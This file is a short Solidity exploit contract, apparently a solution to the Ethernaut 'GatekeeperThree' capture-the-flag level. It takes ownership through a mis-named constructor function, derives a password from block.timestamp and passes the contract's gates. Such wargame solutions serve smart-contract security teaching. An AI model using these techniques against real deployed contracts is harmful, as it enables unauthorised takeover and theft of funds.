// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;
import "../../src/GatekeeperThree/GatekeeperThree.sol";
import "../BlockUtils.sol";

contract GatekeeperThreeExploit is BlockUtils {
    GatekeeperThree victim;
    
    constructor(address _victim) {
        victim = GatekeeperThree(payable(_victim));
    }

    function hack() public {
        // Become owner
        victim.construct0r();

        // Create trick
        victim.createTrick();

        // Reset password in trick contract
        victim.trick().checkPassword(0);

        // Obtain block timestamp
        uint _password = block.timestamp;

        // Get allowance by passing new password
        victim.getAllowance(_password);

        // Enter the gate
        victim.enter();
    }
}